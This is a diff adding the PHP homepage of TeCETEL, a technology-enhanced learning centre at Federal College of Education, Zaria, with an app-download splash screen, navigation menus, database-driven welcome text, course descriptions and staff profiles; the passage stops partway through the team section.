@@ -1,0 +1,1045 @@
+<?php 
+	session_start();
+	include('news/includes/config.php');
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>TeCETEL</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="assets/img/favicon.png" rel="icon">
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Jost:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+  <style>
+  /* Splash Screen Styles */
+  .splash-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.9);
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    color: white;
+    transition: all 0.5s ease;
+    opacity: 1;
+    visibility: visible;
+  }
+  
+  .splash-screen.hidden {
+    opacity: 0;
+    visibility: hidden;
+  }
+  
+  .splash-content {
+    background: linear-gradient(135deg, #37517e 0%, #00b0ff 100%);
+    padding: 30px;
+    border-radius: 15px;
+    max-width: 600px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    position: relative;
+    overflow: hidden;
+  }
+  
+  .splash-content:before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+    animation: pulse 6s infinite linear;
+  }
+  
+  @keyframes pulse {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  
+  .app-logo {
+    width: 120px;
+    height: 120px;
+    margin-bottom: 20px;
+    border-radius: 25px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    border: 3px solid white;
+  }
+  
+  .splash-title {
+    font-size: 28px;
+    margin-bottom: 15px;
+    font-weight: 700;
+    color: white;
+  }
+  
+  .splash-text {
+    margin-bottom: 25px;
+    line-height: 1.6;
+  }
+  
+  .download-btn {
+    background: #fff;
+    color: #37517e;
+    padding: 12px 30px;
+    border-radius: 50px;
+    font-weight: 600;
+    text-decoration: none;
+    display: inline-block;
+    margin: 10px;
+    transition: all 0.3s;
+    border: 2px solid white;
+    
+    position: relative;
+    
+    cursor: pointer;
+    transition: all 0.3s;
+    
+  }
+  
+  .download-btn:hover {
+    background: transparent;
+    color: white;
+    transform: translateY(-3px);
+  }
+  
+  .close-splash {
+    position: absolute;
+    top: 15px;
+    right: 15px;
+    background: rgba(255,255,255,0.2);
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    transition: all 0.3s;
+  }
+  
+  .close-splash:hover {
+    background: rgba(255,255,255,0.3);
+  }
+  
+  .features-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+    margin: 20px 0;
+  }
+  
+  .feature-item {
+    background: rgba(255,255,255,0.1);
+    padding: 10px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+  }
+  
+  .feature-icon {
+    margin-right: 10px;
+    font-size: 20px;
+  }
+  
+  .splash-screen {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.9);
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    color: white;
+    transition: all 0.5s ease;
+    opacity: 1;
+    visibility: visible;
+    pointer-events: auto; /* Allow clicks when visible */
+}
+  
+.splash-screen.hidden {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none; /* Prevent clicks when hidden */
+}
+</style>
+</head>
+
+<body>
+<!-- Splash Screen -->
+<div id="splashScreen" class="splash-screen">
+  <div class="splash-content">
+    <div class="close-splash">
+      <i class="bi bi-x"></i>
+    </div>
+    <img src="assets/img/app-icon.jpg" alt="Campus Smart App" class="app-logo">
+    <h2 class="splash-title">Introducing Campus Smart Mobile App</h2>
+    <p class="splash-text">
+      Experience seamless access to academic resources, AI-powered learning tools, 
+      and campus services right from your mobile device. Developed by TeCETEL in 
+      collaboration with GAIA Academy.
+    </p>
+    
+    <div class="features-grid">
+      <div class="feature-item">
+        <i class="bi bi-person-badge feature-icon"></i>
+        <span>Digital Student ID</span>
+      </div>
+      <div class="feature-item">
+        <i class="bi bi-journal-text feature-icon"></i>
+        <span>Academic Records</span>
+      </div>
+      <div class="feature-item">
+        <i class="bi bi-robot feature-icon"></i>
+        <span>AI Chat Assistant</span>
+      </div>
+      <div class="feature-item">
+        <i class="bi bi-cloud-arrow-down feature-icon"></i>
+        <span>Course Materials</span>
+      </div>
+    </div>
+    
+    <a href="downloads/CampusSmart.apk" class="download-btn" download="CampusSmart.apk" onclick="event.stopPropagation()">
+  <i class="bi bi-download"></i> Download APK
+</a>
+    <a href="mobiledownload/mobile-app-features.html" class="download-btn" onclick="document.getElementById('splashScreen').classList.add('hidden')">
+  <i class="bi bi-info-circle"></i> Learn More
+</a>
+  </div>
+</div>
+  <!-- ======= Header ======= -->
+  <header id="header" class="fixed-top ">
+    <div class="container d-flex align-items-center">
+
+      <h1 class="logo me-auto"><a href="https://tecetel.fcezaria.edu.ng"><img src="assets/img/logo.png" /></a></h1>
+      <!-- Uncomment below if you prefer to use an image logo -->
+      <!-- <a href="index.html" class="logo me-auto"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
+
+      <nav id="navbar" class="navbar">
+        <ul>
+          <li><a class="nav-link scrollto active" href="https://tecetel.fcezaria.edu.ng/">Home</a></li>
+          
+          <li class="dropdown"><a href="https://tecetel.fcezaria.edu.ng/about.html"><span>About Us</span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/leadership">Leadership</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/vission-mission">Vission and Mission</a></li>
+              <!--<li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/ranking">Ranking</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/history">History</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/campuses">Campuses</a></li>
+              <li><a class="nav-link scrollto" href="#">Alumni</a></li>
+              <li><a class="nav-link scrollto" href="#">Awards</a></li>-->
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/news">News</a></li>
+              <li><a class="nav-link scrollto" href="#">Given/Donations</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/success-story">Success Story</a></li>
+              <li><a class="nav-link scrollto" href="#">Site Map</a></li>
+              <li><a class="nav-link scrollto" href="#">FAQ</a></li>
+            </ul>
+          </li>
+          <li class="dropdown"><a href="#"><span>Academics</span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li><a class="nav-link scrollto" href="#">Student</a></li>
+              <li><a class="nav-link scrollto" href="#">Admission</a></li>
+              <li><a class="nav-link scrollto" href="#">Schools/Faculties</a></li>
+              <li><a class="nav-link scrollto" href="#">Researches</a></li>
+              <li><a class="nav-link scrollto" href="#">Libraries</a></li>
+              <li><a class="nav-link scrollto" href="#">Calander</a></li>
+            </ul>
+          </li>
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/courses">Courses</a></li>
+          <li class="dropdown"><a href="#"><span>Services</span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/profile/login">Student Portal</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/register/">Kaba Workshop Registration</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/mobiledownload.php">Mobile App Download</a></li>
+            </ul>
+          </li>
+          <li class="dropdown"><a href="#"><span>Stakeholders</span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li class="dropdown"><a href="#"><span>TETFund</span> <i class="bi bi-chevron-down"></i></a>
+                <ul>
+                  <li class="dropdown"><a href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/#"><span>Special Intervention</span> <i class="bi bi-chevron-down"></i></a>
+                    <ul>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/center-of-excellence/">Center of Excellence</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">High Impact Intervention</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">Zonal Intervention</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/disaster-recovery/">Disaster Recovery</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/">National Research Fund</a></li>
+                    </ul>
+                  </li>
+                  
+                  <li class="dropdown"><a href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/#"><span>Annual Intervention</span> <i class="bi bi-chevron-down"></i></a>
+                    <ul>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/physical-infrastructure-program/">Physical Infrastructure/Program Upgrade</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/academic-staff-training-development/">Academic Staff Training & Development</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/librarydevelopment/">Library Development</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/conference-attendance/">Conference Attendance</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/institution-based-research/">Institution-Based Research</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/teaching-practice/">Teaching Practice</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/academic-research-journal/">Academic Research Journal</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/ict-support/">ICT Support</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/equipment-fabrication/">Equipment Fabrication</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/academic-manuscripts-development/">Academic Manuscript Development</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/entrepreneurship/">Entrepreneurship</a></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>              
+			  <li class="dropdown"><a href="#"><span>Enterprises</span> <i class="bi bi-chevron-down"></i></a>
+				<ul>
+				  <li class="dropdown"><a href="#"><span>Journals</span> <i class="bi bi-chevron-down"></i></a>
+					<ul>
+					  <li><a class="nav-link scrollto" href="http://zarjes.com/ZAJES">Zajes</a></li>
+					  <li><a class="nav-link scrollto" href="https://fcezaria.edu.ng/zajese/">Zajese</a></li>
+					</ul>
+				  </li>
+				</ul>
+			  </li>
+			  <li><a class="nav-link scrollto" href="https://fcezaria.edu.ng">FCE Zaria</a></li>
+            </ul>
+          </li>
+          
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/news">News</a></li>
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/contact">Contact</a></li>
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/news/admin">Admin</a></li>
+          <li><a class="getstarted scrollto" href="tecetel.html">Documentation</a></li>
+        </ul>
+        <i class="bi bi-list mobile-nav-toggle"></i>
+      </nav><!-- .navbar -->
+
+    </div>
+  </header><!-- End Header -->
+
+  <!-- ======= Hero Section ======= -->
+  <section id="hero" class="d-flex align-items-center">
+
+    <div class="container">
+      <div class="row">
+        
+		<div class="col-lg-6 pt-5 pt-lg-0 order-2 order-lg-1 d-flex flex-column justify-content-center">
+          <h1 data-aos="fade-up">TETFund</h1>
+          <h2 data-aos="fade-up" data-aos-delay="400" style="margin-bottom:10px;">Centre Of Excellence For Technology Enhanced Learning</h2>
+          <h2 data-aos="fade-up" data-aos-delay="800" style="color:#FFF; font-weight:bold;">Federal College of Education, Zaria.</h2>
+          <div data-aos="fade-up" data-aos-delay="1200">
+            <a href="#about" class="btn-get-started scrollto">Get Started</a>
+          </div>
+        </div>
+        <div class="col-lg-6 order-1 order-lg-2 hero-img" data-aos="zoom-in" data-aos-delay="200">
+          <img src="assets/img/hero-img.png" class="img-fluid animated" alt="">
+        </div>
+      </div>
+    </div>
+
+  </section><!-- End Hero -->
+
+  <main id="main">
+
+    <!-- ======= Clients Section ======= -->
+    <style>
+        .logo-carousel {
+          overflow: hidden;
+          position: relative;
+          width: 100%;
+          background: #f9f9f9;
+          padding: 20px 0;
+        }
+        
+        .logo-track {
+          display: flex;
+          animation: scroll-left 35s linear infinite;
+          width: max-content; /* automatic width based on content */
+        }
+
+        
+        .logo-track a {
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          width: 250px; /* fixed width for each logo block */
+          padding: 0 20px;
+        }
+        
+        .logo-track img {
+          max-height: 60px;
+          object-fit: contain;
+        }
+        
+        @keyframes scroll-left {
+          0% {
+            transform: translateX(0);
+          }
+          100% {
+            transform: translateX(-50%);
+          }
+        }
+
+    </style>
+    <section id="clients" class="clients section-bg">
+      <div class="container">
+        <div class="logo-carousel">
+          <div class="logo-track">
+            <a href="https://tetfund.gov.ng" target="_blank"><img src="assets/img/clients/tet2.png" class="img-fluid" alt=""></a>
+            <a href="https://www.iita.org" target="_blank"><img src="assets/img/iita.png" class="img-fluid" alt=""></a>
+            <a href="https://e.huawei.com/en/talent/ict-academy/#/home" target="_blank"><img src="assets/img/huawei.webp" class="img-fluid" alt=""></a>
+            <a href="https://iite.unesco.org" target="_blank"><img src="assets/img/iioe.png" class="img-fluid" alt=""></a>
+            <a href="https://www.usm.my" target="_blank"><img src="assets/img/usm.png" class="img-fluid" alt=""></a>
+            <a href="https://flexisaf.com" target="_blank"><img src="assets/img/flexisaf.svg" class="img-fluid" alt=""></a>
+            <a href="https://trcn.gov.ng/" target="_blank"><img src="assets/img/trcn.jpg" class="img-fluid" alt=""></a>
+            <a href="https://www.actd.us/" target="_blank"><img src="assets/img/actd.jpg" class="img-fluid" alt=""></a>
+    
+            <!-- Repeat logos to create continuous loop effect -->
+            <a href="https://tetfund.gov.ng" target="_blank"><img src="assets/img/clients/tet2.png" class="img-fluid" alt=""></a>
+            <a href="https://www.iita.org" target="_blank"><img src="assets/img/iita.png" class="img-fluid" alt=""></a>
+            <!-- Add other duplicates if needed -->
+          </div>
+        </div>
+      </div>
+    </section>
+
+	<div class="row" data-aos="zoom-in">
+
+      <div class="col-sm-1"></div>
+      <div class="col-sm-7">
+	  
+		<!-- ======= About Us Section ======= -->
+		<section id="about" class="about">
+		  <div class="container" data-aos="fade-up">
+
+			<div class="section-title">
+			  <h2>
+				<?php
+					$query=mysqli_query($con,"select PageTitle from tblpages where PageName='welcome'");
+					$row=mysqli_fetch_array($query);
+					echo $row["PageTitle"];
+				?>
+			  </h2>
+			</div>
+
+			<div class="row content">
+			  <div class="col-lg-9">
+				<p>				  
+				  <?php
+					$query=mysqli_query($con,"select Description from tblpages where PageName='welcome'");
+					$row=mysqli_fetch_array($query);
+					echo $row["Description"];
+				  ?>
+				</p>
+			  </div>
+			  <div class="col-lg-3 pt-4 pt-lg-0">
+				<div class="member" data-aos="fade-up" data-aos-delay="100" style="text-align:center; ">
+				  
+				  <?php
+					$queryPic=mysqli_query($con,"select PageTitle,PageTitle2,PageTitle3,Description from tblpages where PageName='welcomePic'");
+					$rowPic=mysqli_fetch_array($queryPic);					
+				  ?>
+				 <!-- <b>Dr. Ilesanmi Ajibola</b></br><span style='color:#21618C;'>Ph.D Chief Lecturer, Researcher, Certified web-based virtual learning expert.</span><br><span style='color:#D35400'>Center's Director</span> -->
+				  <div class="member-img">
+					<a href="<?php echo "news/admin/pageimages/".$rowPic["Description"];?>" data-gallery="portfolioGallery" class="portfolio-lightbox" title="<?php echo $rowPic["PageTitle3"];?>">
+					<img src="<?php echo "news/admin/pageimages/".$rowPic["Description"];?>" class="img-fluid" alt="" style="border:2px solid #D6EAF8; padding:10px; border-radius:20px; ">
+					</a>
+					
+				  </div>
+				  <div class="member-info">
+					<h4><?php echo $rowPic["PageTitle"];?></h4>
+					<span><?php echo $rowPic["PageTitle2"];?></span>
+				  </div>
+				</div>
+			  </div>
+			</div>
+
+		  </div>
+		
+		  <div class="container" data-aos="fade-up" style="padding-top:80px;;">
+
+			<div class="section-title">
+			  <h2>About Us</h2>
+			</div>
+
+			<div class="row content">
+			  <div class="col-lg-6">
+				<p>				  
+				  <?php
+					$query=mysqli_query($con,"select Description from tblpages where PageName='aboutus1'");
+					$row=mysqli_fetch_array($query);
+					echo $row["Description"];
+				  ?>
+				</p>
+			  </div>
+			  <div class="col-lg-6 pt-4 pt-lg-0">
+				<p>
+				  <?php
+					$query=mysqli_query($con,"select Description from tblpages where PageName='aboutus2'");
+					$row=mysqli_fetch_array($query);
+					echo $row["Description"];
+				  ?>
+				</p>
+				<a href="https://tecetel.fcezaria.edu.ng/about.html" class="btn-learn-more">Read More</a>
+			  </div>
+			</div>
+
+		  </div>
+    
+		
+		</section><!-- End About Us Section -->
+
+
+	  </div>
+      <div class="col-sm-3" style="padding-top:50px;">
+		<!-- Sidebar Widgets Column -->
+		<?php include('news/includes/sidebar2.php');?>
+	  </div>
+      <div class="col-sm-1"></div>
+	<div>
+	
+    <!-- ======= Why Us Section ======= -->
+    <section id="why-us" class="why-us section-bg">
+      <div class="container-fluid" data-aos="fade-up">
+
+        <div class="row">
+
+          <div class="col-lg-7 d-flex flex-column justify-content-center align-items-stretch  order-2 order-lg-1">
+
+            <div class="content">
+              <h3><strong>Our Current Courses</strong></h3>
+
+            </div>
+
+            <div class="accordion-list">
+              <ul>
+                <li>
+                  <a data-bs-toggle="collapse" class="collapsed" data-bs-target="#accordion-list-1"><span>01</span> Digital Literacy <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+                  <div id="accordion-list-1" class="collapse show" data-bs-parent=".accordion-list">
+                    <p>
+                      Digital Literacy is a course or program that aims to equip individuals with the knowledge and skills necessary to effectively navigate and utilize digital technologies. It is designed to help individuals develop the digital skills required to thrive in the digital age and make the most of the opportunities available online.
+                    </p>
+                  </div>
+                </li>
+
+                <li>
+                  <a data-bs-toggle="collapse" data-bs-target="#accordion-list-2" class="collapsed"><span>02</span> Interactive Lesson Processing <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+                  <div id="accordion-list-2" class="collapse" data-bs-parent=".accordion-list">
+                    <p>
+                      Interactive Lesson Processing (ILP) refers to the use of technology and interactive tools to enhance the learning experience and facilitate the processing of information during a lesson or educational session. ILP aims to engage learners actively, promote collaboration, and provide opportunities for meaningful interactions with the content.
+                    </p>
+                  </div>
+                </li>
+
+                <li>
+                  <a data-bs-toggle="collapse" data-bs-target="#accordion-list-3" class="collapsed"><span>03</span> Digital Tools for Tech. Enhance Learing <i class="bx bx-chevron-down icon-show"></i><i class="bx bx-chevron-up icon-close"></i></a>
+                  <div id="accordion-list-3" class="collapse" data-bs-parent=".accordion-list">
+                    <p>
+                      In this course, learners would be introduced to the numerous digital tools available that can enhance learning in the field of technology like Learning Management Systems (LMS), Virtual Reality (VR) and Augmented Reality (AR), Coding Platforms, Online Collaboration Tools, Gamification Platforms, Interactive Content Creation, Online Research and Reference Tools, Video Conferencing and Webinar Platforms, Adaptive Learning Platforms, Online Simulations and Laboratories etc.
+                    </p></div>
+                </li>
+
+              </ul>
+            </div>
+
+          </div>
+
+          <div class="col-lg-5 align-items-stretch order-1 order-lg-2 img" style='background-image: url("assets/img/why-us.png");' data-aos="zoom-in" data-aos-delay="150">&nbsp;</div>
+        </div>
+
+      </div>
+    </section><!-- End Why Us Section -->
+
+    <!-- ======= Services Section ======= -->
+    <section id="services" class="services section-bg">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Milestone</h2>
+          <p>The TETFund Centre of Excellence was inaugurated in TETFund Headquarters on the 24th November 2021. The project was launched in the College, Federal College of Education, Zaria on   to unveil its activities.</p>
+        </div>
+
+        <div class="row">
+          <div class="col-xl-3 col-md-6 d-flex align-items-stretch" data-aos="zoom-in" data-aos-delay="100">
+            <div class="icon-box">
+              <div class="icon"><i class="bx bxl-dribbble"></i></div>
+              <h4 class="title"><a href="">TeCETEL</a></h4>
+              <p class="description">Established on a dedicated facility and systems that support a sustainable functionality of the targeted objectives of the Centre. </p>
+            </div>
+          </div>
+
+          <div class="col-xl-3 col-md-6 d-flex align-items-stretch mt-4 mt-md-0" data-aos="zoom-in" data-aos-delay="200">
+            <div class="icon-box">
+              <div class="icon"><i class="bx bx-file"></i></div>
+              <h4 class="title"><a href="">Philosophy</a></h4>
+              <p class="description">To avail digital literacy affordable to everyone who seeks such knowledge and enhance the quality of teacher education.</p>
+            </div>
+          </div>
+
+          <div class="col-xl-3 col-md-6 d-flex align-items-stretch mt-4 mt-xl-0" data-aos="zoom-in" data-aos-delay="300">
+            <div class="icon-box">
+              <div class="icon"><i class="bx bx-tachometer"></i></div>
+              <h4 class="title"><a href="">Vision</a></h4>
+              <p class="description">To remain a pacesetter in technology-enhanced learning.</p>
+            </div>
+          </div>
+
+          <div class="col-xl-3 col-md-6 d-flex align-items-stretch mt-4 mt-xl-0" data-aos="zoom-in" data-aos-delay="400">
+            <div class="icon-box">
+              <div class="icon"><i class="bx bx-layer"></i></div>
+              <h4 class="title"><a href="">Mission</a></h4>
+              <p class="description">To create a model of education technology that eliminates barriers in providing quality education and administration.</p>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Services Section -->
+
+    <!-- ======= Cta Section ======= -->
+    <section id="cta" class="cta">
+      <div class="container" data-aos="zoom-in">
+
+        <div class="row">
+          <div class="col-lg-9 text-center text-lg-start">
+            <h3>Digital Policies, Pedagogical/Teaching Approaches</h3>
+            <p> TeCETEL seeks to achieve its objective of connecting a quadruple-helix developmental indicator of academics, government, industry, and society through the application of technology to teacher education. </p>
+          </div>
+          <div class="col-lg-3 cta-btn-container text-center">
+            <a class="cta-btn align-middle" href="https://tecetel.fcezaria.edu.ng/tecetel.html#policies">Read More</a>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cta Section -->
+
+    <!-- ======= Team Section ======= -->
+    <section id="team" class="team section-bg">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Team</h2>
+		  <p>Tetfund Centre of Excellence for Technology Enhanced Learning (TeCETEL) is domiciled in Federal College of Education, Zaria, Kaduna State, and runs a Performance-Control Model governance structure. We aim at consistent lightweight governance that isolates educational and policy difficulties in the country, assigns the issues for conceptualisation and solution-driven development, and measures performance for progressive alignments. The Centre's Management Team is drawn from the host College, which includes: The Provost, TeCETEL Director, three (3) Academic Technical Officers, one (1) Communication and Documentation Officer, an Administrative Officer, and a Financial Officer. The management team will be supported by a Technical Advisory Committee (TAC) drawn from the experienced and committed academic staff of the College. Committees and sub-committees are expected to be co-opted from the relevant College community whenever such services are required.</p>
+        </div>
+
+        <div class="row">
+
+          <div class="col-lg-6" data-aos="zoom-in" data-aos-delay="100">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/prov.jpeg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Dr. Suleiman Balarabe</h4>
+                <span>Provost FCE, Zaria</span>
+                <p>Ph.D Chief Lecturer, Researcher, Writer, Great Leader</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+		  
+		  <div class="col-lg-6" data-aos="zoom-in" data-aos-delay="200">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-1.jpeg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Dr. Ilesanmi Ajibola</h4>
+                <span>Center's Director</span>
+                <p>Ph.D Chief Lecturer, Researcher, Certified web-based virtual learning expert.</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-6 mt-4" data-aos="zoom-in" data-aos-delay="300">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-2.jpg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Dr. Ramatu Nuru Asabe</h4>
+                <span>Deputy Director</span>
+                <p>PhD Science Education, Masters in Educational Biology and Bachelor of Science Education Biology.</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-6 mt-4" data-aos="zoom-in" data-aos-delay="400">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-3.jpg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Dr. Ahmad Zubairu</h4>
+                <span>Technical Officer(Research)</span>
+                <p>PhD Applied Geophysics, Professional Diploma in Education, MSc Applied Geophysics, B Tech Applied Physics</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a><a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+		  
+		  <div class="col-lg-6 mt-4" data-aos="zoom-in" data-aos-delay="300">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-4.jpg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Mustapha Mohammed Yusuf</h4>
+                <span>Technical Officer(ICT)</span>
+                <p>B.Sc. Information Technology, DNIIT Honours (Software Engineering)</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-6 mt-4" data-aos="zoom-in" data-aos-delay="400">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-5.jpg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Barr. Mohammad Saminu Abubakar</h4>
+                <span>Administrative Officer</span>
+                <p>LL.M (ABU), LL.B (HONS)</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+		  
+		  <div class="col-lg-6 mt-4" data-aos="zoom-in" data-aos-delay="300">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-6.jpg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Dr Salmanu Yahuza</h4>
+                <span>Comm. & Documentation Officer</span>
+                <p>Ph.D (English Education), M.Ed (Curr & Inst. English), Masters in International Affairs and Diplomacy, B.Ed (Language Arts English), Diploma in Computer Science, NCE (English/History). Teachers' Grade Two Certificate.</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
+                  <a href=""><i class="ri-instagram-fill"></i></a>
+                  <a href=""> <i class="ri-linkedin-box-fill"></i> </a>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-6 mt-4" data-aos="zoom-in" data-aos-delay="400">
+            <div class="member d-flex align-items-start">
+              <div class="pic"><img src="assets/img/team/team-7.jpg" class="img-fluid" alt=""></div>
+              <div class="member-info">
+                <h4>Sadisu Na'ali</h4>
+                <span>Finance officer</span>
+                <p>B.Sc Accounting, Masters of Business Administration(MBA), Certified National Accountant (CNA)</p>
+                <div class="social">
+                  <a href=""><i class="ri-twitter-fill"></i></a>
+                  <a href=""><i class="ri-facebook-fill"></i></a>
